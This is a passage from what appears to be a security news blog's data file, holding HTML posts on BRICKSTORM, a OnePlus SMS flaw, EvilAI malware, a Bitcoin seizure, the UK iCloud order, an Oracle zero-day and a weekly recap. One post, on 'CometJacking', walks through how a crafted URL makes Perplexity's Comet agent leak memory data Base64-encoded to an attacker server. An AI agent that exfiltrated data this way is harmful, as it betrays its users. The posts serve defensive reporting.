        This case highlights the importance of <b>financial awareness and vigilance</b> in an age  
        where fraudsters exploit global trust in digital platforms.
      </p>
    </section>
  `},{id:"brickstorm-backdoor-unc5221-2025",title:"BRICKSTORM Backdoor: China-Linked Hackers Breach U.S. Firms",summary:"UNC5221 (China-linked actors) used a stealthy backdoor called BRICKSTORM to infiltrate legal, SaaS and tech firms — hiding for 393 days while exfiltrating emails and cloning servers.",date:"2025-09-25",author:"EthicalByte",tags:["UNC5221","BRICKSTORM","Advanced Persistent Threat","Backdoor","Data Exfiltration","Supply Chain"],imageKey:"brickstormBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#071024,#0e2740); border-radius:12px; color:#eef6fb;">
      <h3 style="color:#ff6b6b;">🚨 BRICKSTORM: Stealthy 393-Day Intrusion</h3><br>
      <p>
        Security researchers have uncovered a long-running intrusion by a group tracked as <b>UNC5221</b>, leveraging a custom backdoor named <b>BRICKSTORM</b>.  
        The adversary infiltrated top U.S. legal, SaaS, and technology firms and remained undetected for <b>393 days</b>, quietly stealing emails, cloning servers, and moving laterally across environments.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2a3a,#113b53); border-radius:12px; color:#e6f2f8; margin-top:15px;">
      <h3 style="color:#ffd166;">⚙️ How BRICKSTORM Operates</h3><br>
      <p>
        BRICKSTORM is designed for persistence and low-observability. Key tactics observed include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔒 <b>Stealthy persistence</b> via custom service installers and manipulated startup items</li>
        <li>📨 <b>Email harvesting</b> — exfiltrating mailboxes and archived correspondence</li>
        <li>🖥️ <b>Server cloning</b> to reproduce critical VMs/services for deeper lateral movement</li>
        <li>🕵️ <b>Living-off-the-land techniques</b> to avoid signature-based detection</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#062033,#0b2a3d); border-radius:12px; color:#dff3fb; margin-top:15px;">
      <h3 style="color:#7be495;">🔍 Indicators & Detection Challenges</h3><br>
      <p>
        The campaign’s stealth made detection difficult. Observed challenges include:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>❗ <b>Low-and-slow data exfiltration</b> that blends into normal traffic</li>
        <li>❗ <b>Custom tooling</b> that lacks public IoCs for signature detection</li>
        <li>❗ Use of <b>legitimate admin utilities</b> and scheduled tasks to mask activity</li>
      </ul>
      <p>
        Analysts recommend focusing on <b>anomalous account activity, unexpected service clones, and unusual outbound connections</b> rather than relying solely on known IoCs.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#12202b,#243b55); border-radius:12px; color:#ecfbff; margin-top:15px;">
      <h3 style="color:#90caf9;">🌍 Impact on Victims</h3><br>
      <p>
        Victims included high-value targets with sensitive client data and intellectual property. Consequences observed:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📧 Compromised attorney-client correspondence and internal communications</li>
        <li>⚙️ Cloned production servers enabling further covert access and sabotage risk</li>
        <li>🔗 Elevated supply-chain risk as SaaS integrations and third-party connectors were abused</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#08121a,#0d2b3b); border-radius:12px; color:#d8f3ff; margin-top:15px;">
      <h3 style="color:#ff9f43;">🛡️ Recommended Immediate Actions</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔁 Rotate & revoke credentials and API tokens for suspected accounts and services</li>
        <li>🔎 Hunt for cloned VM/service artifacts and unexpected disk images</li>
        <li>🧯 Ensure EDR & telemetry capture is enabled for long-term baselining and retrospective analysis</li>
        <li>🔐 Enforce strict least-privilege policies and break overly broad service permissions</li>
        <li>📢 Notify customers & stakeholders if sensitive client data may have been exposed</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:#f3f9fb; border-radius:12px; color:#122233; margin-top:15px;">
      <h3 style="color:#2563eb;">✅ Final Thoughts</h3><br>
      <p>
        BRICKSTORM shows how advanced actors can combine custom backdoors, living-off-the-land techniques, and patient operations to steal high-value data while remaining invisible.  
        The modern defense playbook must include threat hunting, aggressive credential hygiene, and continuous telemetry — because long dwell times cause the most damage.
      </p>
    </section>
  `},{id:"oneplus-cve-2025-10184",title:"⚠️ OnePlus OxygenOS Flaw Exposes MFA SMS Codes",summary:"A high-severity vulnerability (CVSS 8.2) in OxygenOS allows malicious apps to read SMS—including multi-factor authentication codes—without user consent.",date:"2025-09-26",author:"EthicalByte",tags:["OnePlus","Vulnerability","CVE-2025-10184","Android Security","MFA Bypass"],imageKey:"oneplusSMSVuln",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 Critical Flaw in OxygenOS Exposes Your Messages</h3><br>
      <p>
        Security researchers have uncovered a dangerous flaw — <b>CVE-2025-10184</b> — impacting 
        OnePlus devices running <b>OxygenOS 12 and later</b>. The vulnerability (CVSS 8.2) allows 
        <b>any malicious app</b> installed on the device to <b>read SMS messages without permission</b>, 
        including sensitive <b>MFA codes</b>, bank OTPs, and account verification texts.
      </p>
      <p>
        Even more concerning: the issue has remained unpatched since <b>2021</b>, putting millions of users at risk.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#1a1a40); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">📱 What Makes CVE-2025-10184 So Dangerous?</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🚫 No permissions needed — malware can read SMS silently</li>
        <li>🔑 MFA, OTPs, and 2FA codes can be intercepted in real-time</li>
        <li>📤 Attackers can use stolen codes to take over accounts and bypass security</li>
        <li>🕵️ Potential for large-scale credential theft and financial fraud</li>
      </ul>
      <p>
        The vulnerability bypasses Android’s standard permission model, exposing users even if they follow best security practices.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🧪 Current Status & OnePlus Response</h3><br>
      <p>
        OnePlus has acknowledged the report and stated that they are <b>“actively investigating”</b> the vulnerability.  
        However, no official patch or update timeline has been announced as of yet.
      </p>
      <p>
        Users running OxygenOS 12 and newer versions should treat this vulnerability as an active risk.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🛡️ How to Protect Yourself</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✔️ Avoid installing apps from unknown sources or sideloading APKs</li>
        <li>✔️ Use an authenticator app instead of SMS-based 2FA where possible</li>
        <li>✔️ Monitor device permissions and uninstall suspicious apps</li>
        <li>✔️ Apply security patches immediately once available</li>
      </ul>
      <p>
        Until OnePlus issues a fix, <b>your best defense is caution</b>. Treat every app installation as a potential risk.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        CVE-2025-10184 is a stark reminder that <b>even trusted OEM software can introduce massive security gaps</b>.  
        Until OxygenOS receives a patch, treat your SMS inbox as <b>compromised territory</b> — and shift to 
        more secure authentication methods immediately.
      </p>
    </section>
  `},{id:"evilai-malware-campaign-2025",title:"EvilAI Malware Masquerades as AI Tools in Global Attack",summary:"A stealthy new malware campaign, 'EvilAI', is hiding inside legitimate AI and productivity apps — targeting critical sectors worldwide with advanced evasion tactics.",date:"2025-09-30",author:"EthicalByte",tags:["EvilAI","Malware","AI Threats","Cybersecurity","Global Campaign"],imageKey:"evilaiMalwareBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 EvilAI: The Malware Hiding in Plain Sight</h3><br>
      <p>
        A new wave of cyberattacks is sweeping across industries — and this time, it's hiding in plain sight.  
        Dubbed <b>"EvilAI"</b>, the campaign involves malicious code embedded inside seemingly legitimate AI and productivity tools, now infecting organizations in <b>India, the U.S., France, Brazil</b>, and beyond.
      </p>
      <p>
        Unlike traditional malware, EvilAI blends perfectly with business workflows, bypassing most security tools and staying undetected for weeks — or even months.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e0e0e0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How EvilAI Works</h3><br>
      <p>
        This is not a typical malicious payload. EvilAI leverages legitimate features and developer frameworks to hide its activity:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Uses <b>valid code-signing certificates</b> to appear authentic</li>
        <li>🔐 Encrypts command-and-control (C2) traffic with <b>AES encryption</b></li>
        <li>🧩 Exploits <b>NeutralinoJS</b> to execute payloads inside trusted app processes</li>
        <li>🦠 Deploys modular components for <b>data theft, credential harvesting,</b> and <b>persistence</b></li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🏭 Targeted Industries</h3><br>
      <p>
        EvilAI is targeting sectors where disruption or data theft has maximum impact. Current intelligence points to attacks against:
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🏭 <b>Manufacturing</b> – Industrial espionage and supply chain disruptions</li>
        <li>🏥 <b>Healthcare</b> – Patient record theft and ransomware staging</li>
        <li>🏛️ <b>Government</b> – Surveillance and long-term espionage</li>
        <li>💻 <b>Tech Companies</b> – Source code exfiltration and backdoor planting</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">⚠️ Why It’s So Dangerous</h3><br>
      <p>
        EvilAI is redefining how malware operates. By <b>hiding inside trusted applications</b> and <b>using real developer techniques</b>, it bypasses antivirus engines, EDR systems, and even zero-trust policies.  
        Once inside, it establishes persistence, spreads laterally, and can <b>harvest sensitive data silently</b>.
      </p>
      <p>
        Even seasoned security teams are finding it difficult to distinguish legitimate AI behavior from malicious activity.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2196f3;">🔍 Final Thoughts</h3><br>
      <p>
        <b>EvilAI</b> proves that the future of cyberattacks is not brute force — it's <b>deception</b>.  
        As AI tools become ubiquitous, security teams must scrutinize even trusted software for hidden threats.  
        The question is no longer “Is this app safe?” but “Do I know <b>what’s running inside</b> it?”
      </p>
    </section>
  `},{id:"uk-bitcoin-seizure-2025",title:"U.K. Police Seize £5.5B in Bitcoin – Largest Crypto Bust Ever",summary:"A Chinese fraudster behind a massive crypto scam laundering 61,000 BTC is caught in London, marking the world’s largest Bitcoin seizure.",date:"2025-10-01",author:"EthicalByte",tags:["Crypto Crime","Bitcoin","UK Police","Money Laundering","Cybercrime"],imageKey:"ukBitcoinBust",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#f8f9fa;">
      <h3 style="color:#ff4d6d;">🚨 £5.5 Billion Bitcoin Seized in Record-Breaking Operation</h3><br>
      <p>
        In one of the most staggering cryptocurrency crackdowns ever recorded, 
        <b>U.K. police seized £5.5 billion ($7.4 billion)</b> worth of Bitcoin — marking the <b>largest crypto confiscation in history</b>.  
        The operation targeted a Chinese national accused of orchestrating a massive fraud scheme that victimized more than 
        <b>128,000 people worldwide</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">💰 How the Billion-Dollar Scam Worked</h3><br>
      <p>
        The suspect allegedly <b>laundered stolen funds into 61,000 BTC</b>, cleverly spreading the cryptocurrency across 
        various wallets to evade detection.  
        Using <b>fake identities and shell accounts</b>, the fraudster attempted to remain undetected while transferring 
        illicit gains into digital assets.
      </p>
      <p>
        Investigators revealed that the stolen money came from a sophisticated investment scam targeting users across multiple countries.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">🏙️ The Mistake That Got Her Caught</h3><br>
      <p>
        After months of digital laundering, the scammer made a critical error: attempting to <b>purchase high-end property in London</b>.  
        This triggered scrutiny from financial watchdogs, who flagged the transactions, leading to her arrest and the historic seizure.
      </p>
      <p>
        Authorities also discovered <b>multiple fake passports and identities</b> used to mask her real identity.
      </p>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🌍 Why This Seizure Matters</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>💸 Largest Bitcoin confiscation in global history</li>
        <li>👮‍♂️ Huge blow to international money-laundering networks</li>
        <li>🔎 Proves traditional law enforcement is adapting to digital finance</li>
      </ul>
      <p>
        This case highlights how cybercriminals are evolving — but so are investigators.  
        Even in the decentralized world of crypto, <b>law enforcement is catching up</b>.
      </p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1e293b,#0f172a); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        The £5.5 billion Bitcoin seizure is more than a victory for U.K. police — it’s a warning to cybercriminals worldwide.  
        In the age of digital finance, <b>no amount of obfuscation can guarantee anonymity forever</b>.
      </p>
    </section>
  `},{id:"uk-apple-icloud-backdoor-2025",title:"UK Demands Apple Break iCloud Encryption for Britons",summary:"New British order challenges Apple’s encryption policy, forcing potential access to iCloud backups of UK users. Critics say this could weaken global data security.",date:"2025-10-03",author:"EthicalByte",tags:["UK","Apple","iCloud","Encryption Backdoor","Privacy","Tech Policy"],imageKey:"ukAppleBackdoorBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 U.K. Orders Apple to Break iCloud Encryption</h3><br>
      <p>
        In a dramatic escalation of privacy vs. security tensions, the <b>U.K. government</b> has issued a new order compelling Apple to disable or bypass encryption on iCloud backups of British users.  
        This move comes after Apple earlier disabled its <b>Advanced Data Protection (ADP)</b> for UK users under pressure.  
        The order reportedly covers <b>entire data categories</b> — not just narrow or case-by-case access.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🔐 What’s Being Demanded</h3><br>
      <p>
        The request (widely described as a <b>Technical Capability Notice</b>) isn’t just about disabling ADP — it seeks mechanisms for access across <b>photos, messages, device backups, files, notes</b>, and more that are stored in iCloud.  
        Practically, this would require <b>breaking end-to-end encryption coverage</b> or preventing it from being applied in the first place.
      </p>
      <p>
        Apple has previously argued that any exceptional access creates <b>systemic risk</b> and undermines user trust, even when intended for lawful purposes.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2436,#0f3350); border-radius:12px; color:#e6f2f8; margin-top:15px;">
      <h3 style="color:#7bdff2;">🔎 Quick Primer: What is Advanced Data Protection (ADP)?</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🧩 <b>ADP</b> extends end-to-end encryption to additional iCloud categories (like device backups and Photos), so <b>only you</b> hold the keys.</li>
        <li>🔑 With ADP on, even Apple can’t access the protected content — which is why governments target it.</li>
        <li>🌐 Turning ADP off reverts some data to server-side encryption where Apple holds recovery keys.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Why This Is Dangerous</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🛡 Weakening encryption in one jurisdiction creates a <b>global attack surface</b> for criminals and hostile states.</li>
        <li>🔓 Any “lawful access” capability becomes a <b>high-value target</b> for exploitation.</li>
        <li>🌐 Sets a precedent: other countries may push for the <b>same backdoor</b> or broader access.</li>
        <li>🤝 Undermines <b>user trust</b> and the viability of cloud security guarantees.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#12202b,#243b55); border-radius:12px; color:#ecfbff; margin-top:15px;">
      <h3 style="color:#90caf9;">🧭 Possible Paths Apple Could Take</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚖️ <b>Legal pushback</b> (appeals/limited compliance) — arguing that broad backdoors are disproportionate.</li>
        <li>🗺️ <b>Regional feature changes</b> — limiting ADP in certain markets (privacy impact + fragmentation risk).</li>
        <li>🔒 <b>Technical redesigns</b> to reduce Apple’s key custody even further, minimizing compelled access.</li>
        <li>📣 <b>Transparency updates</b> — clarifying what data remains end-to-end encrypted vs server-side encrypted.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a1a,#2b2b2b); border-radius:12px; color:#f1f1f1; margin-top:15px;">
      <h3 style="color:#ffe066;">🛡 What UK Users Can Do Right Now</h3><br>
      <ul style="margin-left:20px; line-height:1.9;">
        <li>🔑 Prefer <b>non-SMS 2FA</b> (authenticator apps or passkeys) for Apple ID and critical accounts.</li>
        <li>🧰 Use <b>end-to-end encrypted apps</b> for chat/files (iMessage E2EE, FaceTime, or third-party E2EE services).</li>
        <li>💽 Keep <b>local encrypted backups</b> (Finder/iTunes with encrypted backup) if ADP isn’t available.</li>
        <li>🗂️ Regularly review <b>iCloud Data Categories</b> and disable sync for data you prefer to keep only on-device.</li>
        <li>🧾 Monitor Apple’s <b>security advisories</b> and enable <b>advanced logging</b> where possible.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🏢 For Enterprises & Regulated Teams</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>📜 Update <b>data residency & lawful access</b> language in vendor risk assessments.</li>
        <li>🔐 Enforce <b>device encryption + MDM</b> restrictions on cloud sync for sensitive roles.</li>
        <li>🕵️ Adopt <b>client-side E2EE tooling</b> for legal, medical, and finance workflows.</li>
        <li>🧪 Perform <b>tabletop exercises</b> simulating compelled access and cross-border requests.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#0f1924; border-radius:12px; color:#d7e9ff; margin-top:15px;">
      <h3 style="color:#64dfdf;">🗓️ Context & Timeline (High Level)</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Apple expands <b>ADP</b> to cover more iCloud categories (stronger E2EE).</li>
        <li>🇬🇧 UK pushes for access under <b>Investigatory Powers Act</b> mechanisms.</li>
        <li>🧭 Ongoing back-and-forth: regional feature limits, legal challenges, and new orders.</li>
      </ul>
    </section>

    <section style="padding:20px; background:#f8f9fa; border-radius:12px; color:#222; margin-top:15px;">
      <h3 style="color:#2563eb;">❓FAQ: Common Questions</h3><br>
      <p><b>Q: Does this mean Apple can read my iCloud data now?</b><br>
      <i>A:</i> Not automatically. This is about <b>compelled capability</b>. Whether and how it’s enforced, and which categories are affected, depends on Apple’s response and legal processes.</p>
      <p><b>Q: Is iMessage still end-to-end encrypted?</b><br>
      <i>A:</i> Yes. But <b>message backups</b> in iCloud are the sensitive area if E2EE isn’t applied to backups (that’s what ADP addresses).</p>
      <p><b>Q: What if I already use ADP?</b><br>
      <i>A:</i> Keep it enabled where available. If ADP isn’t offered in your region/account, rely on <b>local encrypted backups</b> and on-device storage for highly sensitive data.</p>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        The UK’s push to force Apple into breaking encryption reignites a global debate:  
        Can you demand security from companies <b>without</b> eroding the very foundations of digital privacy?  
        In attempting to protect citizens, governments may create a <b>single point of failure</b> that endangers everyone.
      </p>
    </section>
  `},{id:"cometjacking-insider-threat-2025",title:"CometJacking: One Click Turns Perplexity’s AI into an Insider Threat",summary:"A new exploit called 'CometJacking' abuses Perplexity’s AI agent memory to exfiltrate sensitive data — including Gmail and Calendar — with a single malicious URL, no credentials required.",date:"2025-10-05",author:"EthicalByte",tags:["AI Security","CometJacking","Perplexity","Insider Threat","Data Exfiltration"],imageKey:"cometJackingBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0d0d0d,#1a1a40); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d6d;">🚨 CometJacking: Turning AI Against You</h3><br>
      <p>
        Security researchers have uncovered a dangerous new exploit called <b>CometJacking</b> — a technique that turns Perplexity’s AI agent, <b>Comet</b>, into a stealthy insider threat with just one malicious link.
      </p>
      <p>
        A single crafted URL can <b>hijack the Comet agent</b>, query its internal memory (<code>collection=...</code>), and <b>exfiltrate sensitive data</b> such as Gmail contents or calendar events <b>without requiring any credentials</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#e2e8f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How the Exploit Works</h3><br>
      <p>
        Comet’s internal memory feature is designed to store contextual information from previous sessions to improve responses. However, attackers discovered they could <b>trick the agent into exposing this memory</b> remotely through a simple <b>GET request</b>.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Step 1: Host a malicious URL embedding a query that targets the Comet memory API.</li>
        <li>✅ Step 2: The agent reads and processes the request — <b>no auth or permissions required</b>.</li>
        <li>✅ Step 3: Exfiltrated data is <b>Base64-encoded</b> and sent off-box to an attacker-controlled server.</li>
      </ul>
      <p>
        Because the action occurs within the context of a “trusted” AI agent, <b>traditional security tools fail to flag the activity</b>.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Real-World Impact</h3><br>
      <p>
        CometJacking shows how <b>AI memory itself can become a data leak vector</b>.  
        Sensitive corporate data, emails, cloud tokens, calendar details, and internal conversations — once stored for context — can be quietly siphoned off by malicious actors.
      </p>
      <p>
        The risk is amplified because <b>no credentials, phishing, or malware deployment</b> are required. A single URL click is enough.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🛡️ Defenses and Mitigations</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Restrict agent memory exposure with <b>access control layers</b> and validation checks.</li>
        <li>🚫 Disable or isolate sensitive memory storage in production environments.</li>
        <li>📊 Implement <b>URL sanitization</b> and strict query whitelisting before processing requests.</li>
        <li>🧠 Monitor LLM agents for <b>unexpected outbound traffic</b> or Base64 data streams.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:#f8f9fa; border-radius:12px; color:#333; margin-top:15px;">
      <h3 style="color:#2563eb;">🚀 Final Thoughts</h3><br>
      <p>
        CometJacking proves that <b>AI systems are not just attack targets — they can become attackers themselves</b>.  
        As enterprise adoption of agentic AI accelerates, organizations must treat these systems like any other endpoint: <b>monitor, restrict, and harden them</b>.
      </p>
    </section>
  `},{id:"oracle-ebs-zero-day-cl0p-2025",title:"Oracle Patches CVE-2025-61882: Cl0p Exploits Live Zero-Day in EBS",summary:"Oracle released an emergency patch for a critical 9.8 flaw in E-Business Suite (CVE-2025-61882), which is being actively exploited by Cl0p to steal data. The exploit enables remote code execution without authentication. Apply immediately. ",date:"2025-10-06",author:"EthicalByte",tags:["Oracle","EBS","Zero-Day","Cl0p","RCE","Cybersecurity"],imageKey:"oracleEBSZeroDayBanner",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0a0a0a,#1f1f3a); border-radius:12px; color:#f5f5f5;">
      <h3 style="color:#ff4d4d;">🚨 Oracle Rushes Patch for Critical EBS Zero-Day</h3><br>
      <p>
        Oracle has issued an emergency security alert for **CVE-2025-61882**, a **critical 9.8 CVSS** vulnerability in E-Business Suite (EBS).  
        This flaw allows unauthenticated remote attackers to execute code on vulnerable instances without needing usernames or passwords. 
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1a1a40,#2c003e); border-radius:12px; color:#dfe7f0; margin-top:15px;">
      <h3 style="color:#ffd166;">🧠 How It’s Being Exploited</h3><br>
      <p>
        Evidence suggests the Cl0p ransomware/extortion group is actively leveraging this zero-day to steal data from victim EBS environments.   
        In many cases, victims have received extortion emails claiming their data is already compromised.
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ The vulnerability affects EBS versions "12.2.3 through 12.2.14", specifically in the Concurrent Processing / BI Publisher integration.</li>
        <li>✅ Attackers may exploit it by sending crafted HTTP requests to vulnerable endpoints.</li>
        <li>✅ Because it’s unauthenticated, common defenses (like requiring login) are bypassed.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#003049,#001219); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#06d6a0;">⚠️ Why This Is Alarming</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔐 Zero-day RCE with **no credentials needed** — extremely dangerous.</li>
        <li>💼 EBS is often central to enterprise operations (finance, HR, supply chain) — breach impact is high.</li>
        <li>💸 The linkage to **Cl0p extortion** means data theft might already be in progress. </li>
        <li>⚠️ Many organizations may already be compromised but unaware.</li>
      </ul>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#2c003e,#0d0d0d); border-radius:12px; color:#d1e0f0; margin-top:15px;">
      <h3 style="color:#ff4d6d;">🛡 Mitigation & Next Steps</h3><br>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>✅ Immediately apply Oracle’s patch for CVE-2025-61882. </li>
        <li>✅ Compare configured endpoints to known vulnerable paths and apply firewall rules.</li>
        <li>✅ Monitor for anomalous activity, especially suspicious HTTP requests or data exfiltration traffic.</li>
        <li>✅ Review Oracle’s advisory and risk matrices in their patch documentation.</li>
        <li>✅ For organizations that can’t patch immediately, isolate or disable exposed modules if feasible.</li>
      </ul>
    </section>

    <section style="padding:20px; text-align:center; background:linear-gradient(135deg,#1a1a40,#0d0d0d); border-radius:12px; color:#f5f5f5; margin-top:15px;">
      <h3 style="color:#ff4d6d;">✅ Final Thoughts</h3><br>
      <p>
        CVE-2025-61882 is not just another zero-day — it’s a critical entry point with direct ties to data theft and extortion.  
        If you run Oracle EBS, your top priority must be patching immediately and validating your environment for any signs of compromise.  
        The time to act is already overdue.
      </p>
    </section>
  `},{id:"weekly-cyber-recap-2025-10-05",title:"Weekly Cyber Recap — Patch Fast. Detect Early. Defend Better.",summary:"This week’s cybersecurity roundup highlights why rapid patching, proactive detection, and future-proof defense strategies are essential against evolving threats — from zero-day exploits to new browser-based attack vectors.",date:"2025-10-07",author:"EthicalByte",tags:["Weekly Recap","Zero-Day","Patch Now","Threat Intelligence","Defense"],imageKey:"weeklyRecapBannerOct2025",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0f172a,#1e293b); border-radius:12px; color:#eef2ff;">
      <h3 style="color:#60a5fa;">⚡ The Threat Landscape Never Slows Down</h3><br>
      <p>
        Cybersecurity is an ongoing race — one where every second counts. As attackers innovate, organizations must continuously adapt. 
        This week’s major headlines remind us that security isn’t about reacting — it’s about anticipating. From emergency patches for actively exploited 
        vulnerabilities to sophisticated phishing campaigns bypassing MFA, defenders must remain vigilant, proactive, and informed.
      </p>
      <p>
        In this recap, we break down the most important lessons: <b>patch smarter</b> to shrink your attack surface, <b>detect early</b> before intrusions escalate, 
        and <b>prepare for what’s next</b> — because the next breach is already being planned.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#1e293b,#312e81); border-radius:12px; color:#e5e7eb; margin-top:15px;">
      <h3 style="color:#fbbf24;">🛠 Patch Smarter (Not Later)</h3><br>
      <p>
        Patching remains the single most effective defense against known vulnerabilities — yet many organizations still lag behind. This week, we saw critical zero-days 
        in widely used enterprise platforms being actively exploited within hours of disclosure. These incidents underline a key truth: <b>delayed patching equals unnecessary risk.</b>
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>⚡ <b>Prioritize internet-facing apps</b> and services where exposure risk is highest.</li>
        <li>🛠 Use <b>staged deployment</b> and <b>maintenance windows</b> to minimize operational disruption.</li>
        <li>📊 Leverage <b>threat intelligence</b> to track active exploitation and adjust patching urgency dynamically.</li>
      </ul>
      <p>
        In short, patching should not be a routine chore — it’s a strategic security function. The faster you close the window of exposure, the fewer opportunities attackers have.
      </p>
    </section>

    <section style="padding:20px; background:linear-gradient(135deg,#0b2538,#0f3449); border-radius:12px; color:#dbeafe; margin-top:15px;">
      <h3 style="color:#34d399;">👀 Spot Early Risks Before They Escalate</h3><br>
      <p>
        Attackers rarely start with obvious moves. Instead, they leave subtle traces — anomalies that, if detected early, can prevent a full-scale breach. 
        Early detection isn’t just about monitoring; it’s about understanding behavior, context, and intent.
      </p>
      <ul style="margin-left:20px; line-height:1.8;">
        <li>🔍 Hunt for <b>anomalous authentication events</b>, unusual log spikes, and unexplained outbound traffic.</li>
        <li>🧩 Monitor <b>browser activity</b> — extensions, token misuse, and session hijacks are becoming common attack vectors.</li>
